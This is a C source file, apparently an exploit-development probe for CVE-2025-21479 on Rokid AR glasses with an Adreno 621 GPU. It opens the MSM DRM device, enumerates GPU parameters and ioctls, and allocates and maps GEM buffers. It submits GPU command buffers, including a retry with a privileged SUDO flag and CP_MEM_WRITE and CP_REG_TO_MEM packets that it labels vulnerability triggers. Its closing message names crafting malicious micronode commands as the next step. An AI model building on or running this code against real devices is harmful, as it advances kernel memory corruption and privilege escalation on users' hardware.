/*
 * CVE-2025-21479 MSM DRM Path Probe v2
 * =====================================
 *
 * KGSL context creation fails ("legacy context switch not supported")
 * Explore the MSM DRM path as alternative GPU access method.
 *
 * Key capabilities:
 * - Submitqueue (context creation via DRM)
 * - GEM buffer allocation and mapping
 * - GPU command submission
 * - Potential CVE-2025-21479 exploitation via DRM
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// ═══════════════════════════════════════════════════════════════════════════
// DRM IOCTL Definitions (avoid header dependency)
// ═══════════════════════════════════════════════════════════════════════════

#define DRM_COMMAND_BASE 0x40

/* Standard DRM IOCTLs */
#define DRM_IOCTL_VERSION _IOWR('d', 0x00, struct drm_version)
#define DRM_IOCTL_GEM_CLOSE _IOW('d', 0x09, struct drm_gem_close)
#define DRM_IOCTL_GET_CAP _IOWR('d', 0x0c, struct drm_get_cap)

/* MSM-specific DRM IOCTLs */
#define DRM_MSM_GET_PARAM 0x00
#define DRM_MSM_GEM_NEW 0x02
#define DRM_MSM_GEM_INFO 0x03
#define DRM_MSM_GEM_CPU_PREP 0x04
#define DRM_MSM_GEM_CPU_FINI 0x05
#define DRM_MSM_GEM_SUBMIT 0x06
#define DRM_MSM_WAIT_FENCE 0x07
#define DRM_MSM_GEM_MADVISE 0x08
#define DRM_MSM_SUBMITQUEUE_NEW 0x0A
#define DRM_MSM_SUBMITQUEUE_CLOSE 0x0B
#define DRM_MSM_SUBMITQUEUE_QUERY 0x0C

#define DRM_IOCTL_MSM_GET_PARAM _IOWR('d', DRM_COMMAND_BASE + DRM_MSM_GET_PARAM, struct drm_msm_param)
#define DRM_IOCTL_MSM_GEM_NEW _IOWR('d', DRM_COMMAND_BASE + DRM_MSM_GEM_NEW, struct drm_msm_gem_new)
#define DRM_IOCTL_MSM_GEM_INFO _IOWR('d', DRM_COMMAND_BASE + DRM_MSM_GEM_INFO, struct drm_msm_gem_info)
#define DRM_IOCTL_MSM_GEM_CPU_PREP _IOW('d', DRM_COMMAND_BASE + DRM_MSM_GEM_CPU_PREP, struct drm_msm_gem_cpu_prep)
#define DRM_IOCTL_MSM_GEM_CPU_FINI _IOW('d', DRM_COMMAND_BASE + DRM_MSM_GEM_CPU_FINI, struct drm_msm_gem_cpu_fini)
#define DRM_IOCTL_MSM_GEM_SUBMIT _IOWR('d', DRM_COMMAND_BASE + DRM_MSM_GEM_SUBMIT, struct drm_msm_gem_submit)
#define DRM_IOCTL_MSM_WAIT_FENCE _IOW('d', DRM_COMMAND_BASE + DRM_MSM_WAIT_FENCE, struct drm_msm_wait_fence)
#define DRM_IOCTL_MSM_GEM_MADVISE _IOWR('d', DRM_COMMAND_BASE + DRM_MSM_GEM_MADVISE, struct drm_msm_gem_madvise)
#define DRM_IOCTL_MSM_SUBMITQUEUE_NEW _IOWR('d', DRM_COMMAND_BASE + DRM_MSM_SUBMITQUEUE_NEW, struct drm_msm_submitqueue)
#define DRM_IOCTL_MSM_SUBMITQUEUE_CLOSE _IOW('d', DRM_COMMAND_BASE + DRM_MSM_SUBMITQUEUE_CLOSE, unsigned int)
#define DRM_IOCTL_MSM_SUBMITQUEUE_QUERY _IOWR('d', DRM_COMMAND_BASE + DRM_MSM_SUBMITQUEUE_QUERY, struct drm_msm_submitqueue_query)

// ═══════════════════════════════════════════════════════════════════════════
// DRM Structures
// ═══════════════════════════════════════════════════════════════════════════

struct drm_version
{
    int version_major;
    int version_minor;
    int version_patchlevel;
    size_t name_len;
    char *name;
    size_t date_len;
    char *date;
    size_t desc_len;
    char *desc;
};

struct drm_get_cap
{
    uint64_t capability;
    uint64_t value;
};

struct drm_gem_close
{
    uint32_t handle;
    uint32_t pad;
};

/* MSM param types */
#define MSM_PARAM_GPU_ID 0x01
#define MSM_PARAM_GMEM_SIZE 0x02
#define MSM_PARAM_CHIP_ID 0x03
#define MSM_PARAM_MAX_FREQ 0x04
#define MSM_PARAM_TIMESTAMP 0x05
#define MSM_PARAM_GMEM_BASE 0x06
#define MSM_PARAM_NR_RINGS 0x07
#define MSM_PARAM_PP_PGTABLE 0x08
#define MSM_PARAM_FAULTS 0x09
#define MSM_PARAM_SUSPENDS 0x0a

struct drm_msm_param
{
    uint32_t pipe;
    uint32_t param;
    uint64_t value;
};

/* MSM GEM flags */
#define MSM_BO_SCANOUT 0x00000001
#define MSM_BO_GPU_READONLY 0x00000002
#define MSM_BO_CACHE_MASK 0x000f0000
#define MSM_BO_CACHED 0x00010000
#define MSM_BO_WC 0x00020000
#define MSM_BO_UNCACHED 0x00040000

struct drm_msm_gem_new
{
    uint64_t size;
    uint32_t flags;
    uint32_t handle;
};

struct drm_msm_gem_info
{
    uint32_t handle;
    uint32_t info;
    uint64_t value;
};

#define MSM_INFO_GET_OFFSET 0x00
#define MSM_INFO_GET_IOVA 0x01
#define MSM_INFO_SET_NAME 0x02
#define MSM_INFO_GET_NAME 0x03

struct drm_msm_gem_cpu_prep
{
    uint32_t handle;
    uint32_t op;
    struct
    {
        int64_t tv_sec;
        int64_t tv_nsec;
    } timeout;
};

struct drm_msm_gem_cpu_fini
{
    uint32_t handle;
};

/* GPU command types */
#define MSM_SUBMIT_CMD_BUF 0x0001
#define MSM_SUBMIT_CMD_IB_TARGET_BUF 0x0002
#define MSM_SUBMIT_CMD_CTX_RESTORE_BUF 0x0003

struct drm_msm_gem_submit_cmd
{
    uint32_t type;
    uint32_t submit_idx;
    uint32_t submit_offset;
    uint32_t size;
    uint32_t pad;
    uint32_t nr_relocs;
    uint64_t relocs;
};

#define MSM_SUBMIT_BO_READ 0x0001
#define MSM_SUBMIT_BO_WRITE 0x0002
#define MSM_SUBMIT_BO_DUMP 0x0004

struct drm_msm_gem_submit_bo
{
    uint32_t flags;
    uint32_t handle;
    uint64_t presumed;
};

struct drm_msm_gem_submit
{
    uint32_t flags;
    uint32_t fence;
    uint32_t nr_bos;
    uint32_t nr_cmds;
    uint64_t bos;
    uint64_t cmds;
    int32_t fence_fd;
    uint32_t queueid;
    uint64_t in_syncobjs;
    uint64_t out_syncobjs;
    uint32_t nr_in_syncobjs;
    uint32_t nr_out_syncobjs;
    uint64_t syncobj_stride;
};

#define MSM_SUBMIT_NO_IMPLICIT 0x80000000
#define MSM_SUBMIT_FENCE_FD_IN 0x40000000
#define MSM_SUBMIT_FENCE_FD_OUT 0x20000000
#define MSM_SUBMIT_SUDO 0x10000000
#define MSM_SUBMIT_SYNCOBJ_IN 0x08000000
#define MSM_SUBMIT_SYNCOBJ_OUT 0x04000000

struct drm_msm_wait_fence
{
    uint32_t fence;
    uint32_t pad;
    struct
    {
        int64_t tv_sec;
        int64_t tv_nsec;
    } timeout;
    uint32_t queueid;
};

struct drm_msm_gem_madvise
{
    uint32_t handle;
    uint32_t madv;
    uint32_t retained;
};

/* Submitqueue (context) */
struct drm_msm_submitqueue
{
    uint32_t flags;
    uint32_t prio;
    uint32_t id;
};

struct drm_msm_submitqueue_query
{
    uint64_t data;
    uint32_t id;
    uint32_t param;
    uint32_t len;
};

#define MSM_SUBMITQUEUE_PARAM_FAULTS 0

// ═══════════════════════════════════════════════════════════════════════════
// Adreno PM4 Command Definitions (for exploit payload)
// ═══════════════════════════════════════════════════════════════════════════

/* PM4 type 7 packet header */
#define CP_TYPE7_PKT(opcode, cnt) \
    (((opcode) << 8) | ((cnt) << 0) | (7 << 28))

/* PM4 opcodes */
#define CP_NOP 0x10
#define CP_WAIT_FOR_IDLE 0x26
#define CP_WAIT_REG_MEM 0x3C
#define CP_REG_RMW 0x21
#define CP_REG_TO_MEM 0x3E
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_REG 0x42
#define CP_COND_EXEC 0x44
#define CP_COND_WRITE5 0x45
#define CP_EVENT_WRITE 0x46
#define CP_INDIRECT_BUFFER 0x3F
#define CP_EXEC_CS_INDIRECT 0x41
#define CP_LOAD_STATE6_GEOM 0x32
#define CP_LOAD_STATE6_FRAG 0x34
#define CP_CONTEXT_REG_BUNCH 0x5C

// ═══════════════════════════════════════════════════════════════════════════
// Global State
// ═══════════════════════════════════════════════════════════════════════════

static int drm_fd = -1;
static int g_verbose = 1;

// ═══════════════════════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════════════════════

void print_banner(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2025-21479 MSM DRM Path Probe v2                         ║\n");
    printf("║  ───────────────────────────────────────────────────────────  ║\n");
    printf("║  Target: Rokid AR Glasses (Adreno 621, Kernel 5.10.209)       ║\n");
    printf("║  Path: KGSL blocked -> DRM Submitqueue -> GPU Command Submit  ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// DRM Version & Info
// ═══════════════════════════════════════════════════════════════════════════

void get_drm_version(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" DRM Driver Information\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    char name[128] = {0};
    char date[128] = {0};
    char desc[256] = {0};

    struct drm_version ver = {
        .name = name,
        .name_len = sizeof(name) - 1,
        .date = date,
        .date_len = sizeof(date) - 1,
        .desc = desc,
        .desc_len = sizeof(desc) - 1,
    };

    if (ioctl(drm_fd, DRM_IOCTL_VERSION, &ver) == 0)
    {
        printf("[+] DRM Version: %d.%d.%d\n",
               ver.version_major, ver.version_minor, ver.version_patchlevel);
        printf("    Driver: %s\n", name);
        printf("    Date: %s\n", date);
        printf("    Desc: %s\n", desc);
    }
    else
    {
        printf("[-] DRM_IOCTL_VERSION failed: %s\n", strerror(errno));
    }
}

void get_msm_params(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" MSM GPU Parameters (via DRM)\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    struct
    {
        const char *name;
        uint32_t param;
    } params[] = {
        {"GPU ID", MSM_PARAM_GPU_ID},
        {"GMEM Size", MSM_PARAM_GMEM_SIZE},
        {"Chip ID", MSM_PARAM_CHIP_ID},
        {"Max Freq", MSM_PARAM_MAX_FREQ},
        {"Timestamp", MSM_PARAM_TIMESTAMP},
        {"GMEM Base", MSM_PARAM_GMEM_BASE},
        {"NR Rings", MSM_PARAM_NR_RINGS},
        {"PP Pgtable", MSM_PARAM_PP_PGTABLE},
        {"Faults", MSM_PARAM_FAULTS},
        {"Suspends", MSM_PARAM_SUSPENDS},
    };

    for (size_t i = 0; i < sizeof(params) / sizeof(params[0]); i++)
    {
        struct drm_msm_param p = {
            .pipe = 0,
            .param = params[i].param,
            .value = 0,
        };

        if (ioctl(drm_fd, DRM_IOCTL_MSM_GET_PARAM, &p) == 0)
        {
            if (params[i].param == MSM_PARAM_GPU_ID)
            {
                printf("[+] %-12s: 0x%llx (Adreno %lld%lld%lld)\n",
                       params[i].name,
                       (unsigned long long)p.value,
                       (p.value >> 24) & 0xFF,
                       (p.value >> 16) & 0xFF,
                       (p.value >> 8) & 0xFF);
            }
            else if (params[i].param == MSM_PARAM_GMEM_SIZE)
            {
                printf("[+] %-12s: %llu KB\n", params[i].name,
                       (unsigned long long)p.value / 1024);
            }
            else if (params[i].param == MSM_PARAM_MAX_FREQ)
            {
                printf("[+] %-12s: %llu MHz\n", params[i].name,
                       (unsigned long long)p.value / 1000000);
            }
            else
            {
                printf("[+] %-12s: 0x%llx (%llu)\n", params[i].name,
                       (unsigned long long)p.value, (unsigned long long)p.value);
            }
        }
        else
        {
            printf("[-] %-12s: failed (%s)\n", params[i].name, strerror(errno));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Submitqueue Tests (Context Creation via DRM)
// ═══════════════════════════════════════════════════════════════════════════

int create_submitqueue(uint32_t prio, uint32_t *id_out)
{
    struct drm_msm_submitqueue sq = {
        .flags = 0,
        .prio = prio,
        .id = 0,
    };

    int ret = ioctl(drm_fd, DRM_IOCTL_MSM_SUBMITQUEUE_NEW, &sq);
    if (ret == 0 && id_out)
    {
        *id_out = sq.id;
    }
    return ret;
}

void close_submitqueue(uint32_t id)
{
    ioctl(drm_fd, DRM_IOCTL_MSM_SUBMITQUEUE_CLOSE, &id);
}

void test_submitqueue(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" MSM Submitqueue (GPU Context via DRM)\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    printf("[*] Testing submitqueue creation (DRM equivalent of KGSL context)...\n\n");

    /* Try different priority levels */
    int success_count = 0;
    for (int prio = 0; prio <= 3; prio++)
    {
        uint32_t qid;
        int ret = create_submitqueue(prio, &qid);

        if (ret == 0)
        {
            success_count++;
            printf("    Priority %d: SUCCESS (id=%u)\n", prio, qid);

            /* Query the queue for faults */
            uint32_t faults = 0;
            struct drm_msm_submitqueue_query query = {
                .data = (uint64_t)(uintptr_t)&faults,
                .id = qid,
                .param = MSM_SUBMITQUEUE_PARAM_FAULTS,
                .len = sizeof(faults),
            };

            if (ioctl(drm_fd, DRM_IOCTL_MSM_SUBMITQUEUE_QUERY, &query) == 0)
            {
                printf("             Faults: %u\n", faults);
            }

            close_submitqueue(qid);
        }
        else
        {
            printf("    Priority %d: FAILED (%s)\n", prio, strerror(errno));
        }
    }

    printf("\n[*] Submitqueue success: %d/4\n", success_count);

    if (success_count > 0)
    {
        printf("\n[!] IMPORTANT: DRM Submitqueue works!\n");
        printf("    This provides GPU context capability that KGSL denied.\n");
        printf("    We can now submit GPU commands via DRM path.\n");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// GEM Buffer Tests
// ═══════════════════════════════════════════════════════════════════════════

int alloc_gem(uint64_t size, uint32_t flags, uint32_t *handle_out, uint64_t *iova_out)
{
    struct drm_msm_gem_new gem = {
        .size = size,
        .flags = flags,
        .handle = 0,
    };

    int ret = ioctl(drm_fd, DRM_IOCTL_MSM_GEM_NEW, &gem);
    if (ret < 0)
        return ret;

    if (handle_out)
        *handle_out = gem.handle;

    if (iova_out)
    {
        struct drm_msm_gem_info info = {
            .handle = gem.handle,
            .info = MSM_INFO_GET_IOVA,
        };
        if (ioctl(drm_fd, DRM_IOCTL_MSM_GEM_INFO, &info) == 0)
        {
            *iova_out = info.value;
        }
    }

    return 0;
}

void *map_gem(uint32_t handle, uint64_t size)
{
    struct drm_msm_gem_info info = {
        .handle = handle,
        .info = MSM_INFO_GET_OFFSET,
    };

    if (ioctl(drm_fd, DRM_IOCTL_MSM_GEM_INFO, &info) < 0)
    {
        return MAP_FAILED;
    }

    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, drm_fd, info.value);
}

void close_gem(uint32_t handle)
{
    struct drm_gem_close close_req = {
        .handle = handle,
    };
    ioctl(drm_fd, DRM_IOCTL_GEM_CLOSE, &close_req);
}

void test_gem_buffers(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" MSM GEM Buffer Allocation & Mapping\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    uint32_t handle;
    uint64_t iova;

    /* Test WC (write-combine) buffer */
    if (alloc_gem(4096, MSM_BO_WC, &handle, &iova) == 0)
    {
        printf("[+] WC Buffer Allocated: handle=%u, iova=0x%llx\n",
               handle, (unsigned long long)iova);

        void *ptr = map_gem(handle, 4096);
        if (ptr != MAP_FAILED)
        {
            printf("[+] Mapped to userspace: %p\n", ptr);

            /* Write test pattern */
            memset(ptr, 0x41, 256);
            printf("    Test write: OK\n");

            munmap(ptr, 4096);
        }
        else
        {
            printf("[-] mmap failed: %s\n", strerror(errno));
        }

        close_gem(handle);
    }
    else
    {
        printf("[-] WC buffer allocation failed: %s\n", strerror(errno));
    }

    /* Test cached buffer */
    if (alloc_gem(4096, MSM_BO_CACHED, &handle, &iova) == 0)
    {
        printf("[+] Cached Buffer: handle=%u, iova=0x%llx\n",
               handle, (unsigned long long)iova);
        close_gem(handle);
    }

    /* Test uncached buffer */
    if (alloc_gem(4096, MSM_BO_UNCACHED, &handle, &iova) == 0)
    {
        printf("[+] Uncached Buffer: handle=%u, iova=0x%llx\n",
               handle, (unsigned long long)iova);
        close_gem(handle);
    }

    /* Test large allocation */
    if (alloc_gem(1024 * 1024, MSM_BO_WC, &handle, &iova) == 0)
    {
        printf("[+] Large (1MB) Buffer: handle=%u, iova=0x%llx\n",
               handle, (unsigned long long)iova);
        close_gem(handle);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// GPU Command Submit Test
// ═══════════════════════════════════════════════════════════════════════════

void test_gpu_submit(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" MSM GPU Command Submit\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    uint32_t qid;
    uint32_t handle;
    uint64_t iova;
    int ret;

    /* Create submitqueue */
    ret = create_submitqueue(0, &qid);
    if (ret < 0)
    {
        printf("[-] Failed to create submitqueue: %s\n", strerror(errno));
        return;
    }
    printf("[+] Submitqueue created: id=%u\n", qid);

    /* Allocate command buffer */
    ret = alloc_gem(4096, MSM_BO_WC, &handle, &iova);
    if (ret < 0)
    {
        printf("[-] Failed to allocate GEM: %s\n", strerror(errno));
        close_submitqueue(qid);
        return;
    }
    printf("[+] GEM buffer: handle=%u, iova=0x%llx\n", handle, (unsigned long long)iova);

    /* Map and write PM4 commands */
    void *ptr = map_gem(handle, 4096);
    if (ptr == MAP_FAILED)
    {
        printf("[-] Failed to map GEM: %s\n", strerror(errno));
        close_gem(handle);
        close_submitqueue(qid);
        return;
    }
    printf("[+] GEM mapped: %p\n", ptr);

    /* Build minimal command buffer with NOP packets */
    uint32_t *cmds = (uint32_t *)ptr;
    int idx = 0;

    /* NOP packet (type 7, opcode 0x10) */
    cmds[idx++] = CP_TYPE7_PKT(CP_NOP, 0);

    /* Wait for idle */
    cmds[idx++] = CP_TYPE7_PKT(CP_WAIT_FOR_IDLE, 0);

    /* More NOPs to pad */
    for (int i = 0; i < 10; i++)
    {
        cmds[idx++] = CP_TYPE7_PKT(CP_NOP, 0);
    }

    printf("[*] Built command buffer: %d dwords\n", idx);

    /* Set up submit structures */
    struct drm_msm_gem_submit_bo bo = {
        .flags = MSM_SUBMIT_BO_READ | MSM_SUBMIT_BO_DUMP,
        .handle = handle,
        .presumed = iova,
    };

    struct drm_msm_gem_submit_cmd cmd = {
        .type = MSM_SUBMIT_CMD_BUF,
        .submit_idx = 0,
        .submit_offset = 0,
        .size = idx * 4, /* size in bytes */
        .nr_relocs = 0,
        .relocs = 0,
    };

    struct drm_msm_gem_submit submit = {
        .flags = 0,
        .nr_bos = 1,
        .nr_cmds = 1,
        .bos = (uint64_t)(uintptr_t)&bo,
        .cmds = (uint64_t)(uintptr_t)&cmd,
        .fence_fd = -1,
        .queueid = qid,
    };

    ret = ioctl(drm_fd, DRM_IOCTL_MSM_GEM_SUBMIT, &submit);

    if (ret == 0)
    {
        printf("\n[+] ██████████████████████████████████████████████████\n");
        printf("[+] ███  GPU SUBMIT SUCCESS!  fence=%u             ███\n", submit.fence);
        printf("[+] ██████████████████████████████████████████████████\n\n");
        printf("[!] We can submit GPU commands via DRM!\n");
        printf("    This bypasses the KGSL context creation restriction.\n");
        printf("    CVE-2025-21479 can potentially be exploited via DRM.\n");
    }
    else
    {
        printf("[-] GPU Submit failed: %s (errno=%d)\n", strerror(errno), errno);

        /* Try with different flags */
        printf("\n[*] Trying with MSM_SUBMIT_SUDO flag...\n");
        submit.flags = MSM_SUBMIT_SUDO;
        ret = ioctl(drm_fd, DRM_IOCTL_MSM_GEM_SUBMIT, &submit);
        if (ret == 0)
        {
            printf("[+] SUDO Submit SUCCESS! fence=%u\n", submit.fence);
        }
        else
        {
            printf("[-] SUDO Submit failed: %s\n", strerror(errno));
        }
    }

    /* Cleanup */
    munmap(ptr, 4096);
    close_gem(handle);
    close_submitqueue(qid);
    printf("[*] Cleanup complete\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// Advanced: Micronode Command Test (CVE-2025-21479 Target)
// ═══════════════════════════════════════════════════════════════════════════

void test_micronode_commands(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" CVE-2025-21479: Micronode Command Test via DRM\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    uint32_t qid;
    uint32_t handle;
    uint64_t iova;
    int ret;

    /* Create submitqueue */
    ret = create_submitqueue(0, &qid);
    if (ret < 0)
    {
        printf("[-] Submitqueue failed: %s\n", strerror(errno));
        return;
    }

    /* Allocate command buffer */
    ret = alloc_gem(8192, MSM_BO_WC, &handle, &iova);
    if (ret < 0)
    {
        printf("[-] GEM alloc failed: %s\n", strerror(errno));
        close_submitqueue(qid);
        return;
    }

    void *ptr = map_gem(handle, 8192);
    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap failed: %s\n", strerror(errno));
        close_gem(handle);
        close_submitqueue(qid);
        return;
    }

    printf("[+] Setup complete: qid=%u, handle=%u, iova=0x%llx\n",
           qid, handle, (unsigned long long)iova);

    /*
     * CVE-2025-21479 is about memory corruption via unauthorized
     * micronode commands. The GPU micronode can execute commands
     * that affect kernel memory if not properly validated.
     *
     * Key PM4 opcodes that may trigger the vulnerability:
     * - CP_MEM_WRITE: Write to arbitrary GPU address
     * - CP_MEM_TO_REG: Read from memory to GPU register
     * - CP_REG_TO_MEM: Write GPU register to memory
     * - CP_INDIRECT_BUFFER: Execute commands from another buffer
     * - CP_LOAD_STATE6_*: Load shader/state from memory
     */

    uint32_t *cmds = (uint32_t *)ptr;
    int idx = 0;

    /* Test 1: Simple NOP chain */
    printf("\n[*] Test 1: NOP chain\n");
    cmds[idx++] = CP_TYPE7_PKT(CP_NOP, 4);
    cmds[idx++] = 0xDEADBEEF;
    cmds[idx++] = 0xCAFEBABE;
    cmds[idx++] = 0x12345678;
    cmds[idx++] = 0x87654321;

    /* Test 2: WAIT_FOR_IDLE */
    cmds[idx++] = CP_TYPE7_PKT(CP_WAIT_FOR_IDLE, 0);

    /* Test 3: Attempt MEM_WRITE (may trigger CVE-2025-21479) */
    printf("[*] Test 2: CP_MEM_WRITE (CVE-2025-21479 target)\n");
    cmds[idx++] = CP_TYPE7_PKT(CP_MEM_WRITE, 3);
    cmds[idx++] = (uint32_t)(iova & 0xFFFFFFFF); /* addr_lo */
    cmds[idx++] = (uint32_t)(iova >> 32);        /* addr_hi */
    cmds[idx++] = 0x41414141;                    /* data */

    /* Test 4: REG_TO_MEM (read register to our buffer) */
    printf("[*] Test 3: CP_REG_TO_MEM\n");
    cmds[idx++] = CP_TYPE7_PKT(CP_REG_TO_MEM, 3);
    cmds[idx++] = 0x0001; /* register (RBBM status) */
    cmds[idx++] = (uint32_t)((iova + 0x1000) & 0xFFFFFFFF);
    cmds[idx++] = (uint32_t)((iova + 0x1000) >> 32);

    printf("[*] Command buffer: %d dwords\n", idx);

    /* Submit */
    struct drm_msm_gem_submit_bo bo = {
        .flags = MSM_SUBMIT_BO_READ | MSM_SUBMIT_BO_WRITE,
        .handle = handle,
        .presumed = iova,
    };

    struct drm_msm_gem_submit_cmd cmd = {
        .type = MSM_SUBMIT_CMD_BUF,
        .submit_idx = 0,
        .submit_offset = 0,
        .size = idx * 4,
        .nr_relocs = 0,
        .relocs = 0,
    };

    struct drm_msm_gem_submit submit = {
        .flags = 0,
        .nr_bos = 1,
        .nr_cmds = 1,
        .bos = (uint64_t)(uintptr_t)&bo,
        .cmds = (uint64_t)(uintptr_t)&cmd,
        .fence_fd = -1,
        .queueid = qid,
    };

    ret = ioctl(drm_fd, DRM_IOCTL_MSM_GEM_SUBMIT, &submit);

    if (ret == 0)
    {
        printf("\n[+] Micronode commands submitted! fence=%u\n", submit.fence);

        /* Wait for completion */
        struct drm_msm_wait_fence wait = {
            .fence = submit.fence,
            .timeout = {.tv_sec = 1, .tv_nsec = 0},
            .queueid = qid,
        };

        ret = ioctl(drm_fd, DRM_IOCTL_MSM_WAIT_FENCE, &wait);
        if (ret == 0)
        {
            printf("[+] Fence wait completed\n");

            /* Check if REG_TO_MEM wrote data */
            uint32_t *result = (uint32_t *)((char *)ptr + 0x1000);
            printf("[*] REG_TO_MEM result: 0x%08x\n", *result);
        }
        else
        {
            printf("[-] Fence wait failed: %s\n", strerror(errno));
        }
    }
    else
    {
        printf("[-] Micronode submit failed: %s (errno=%d)\n", strerror(errno), errno);
    }

    /* Cleanup */
    munmap(ptr, 8192);
    close_gem(handle);
    close_submitqueue(qid);
}

// ═══════════════════════════════════════════════════════════════════════════
// IOCTL Enumeration
// ═══════════════════════════════════════════════════════════════════════════

void enumerate_drm_ioctls(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" DRM IOCTL Enumeration (MSM 0x40-0x50)\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    for (int cmd = 0x00; cmd <= 0x20; cmd++)
    {
        unsigned long ioctl_num = _IOWR('d', DRM_COMMAND_BASE + cmd, char[256]);
        char buf[256] = {0};

        int ret = ioctl(drm_fd, ioctl_num, buf);
        int err = errno;

        if (err != ENOTTY && err != EINVAL)
        {
            printf("    MSM 0x%02x: ret=%d, errno=%d (%s)\n",
                   cmd, ret, err, strerror(err));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════════

int main(int argc, char **argv)
{
    print_banner();

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    /* Open DRM device */
    drm_fd = open("/dev/dri/card0", O_RDWR);
    if (drm_fd < 0)
    {
        drm_fd = open("/dev/dri/renderD128", O_RDWR);
    }

    if (drm_fd < 0)
    {
        printf("[-] Failed to open DRM device: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened DRM device (fd=%d)\n", drm_fd);

    /* Run tests */
    get_drm_version();
    get_msm_params();
    test_submitqueue();
    test_gem_buffers();
    test_gpu_submit();
    test_micronode_commands();
    enumerate_drm_ioctls();

    close(drm_fd);

    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" Summary\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    printf("[*] KGSL context creation is blocked (\"legacy context switch\").\n");
    printf("[*] DRM Submitqueue provides alternative context creation.\n");
    printf("[*] If GPU submit works, CVE-2025-21479 can be exploited via DRM.\n");
    printf("[*] Next step: Craft malicious micronode commands for exploitation.\n\n");

    return 0;
}
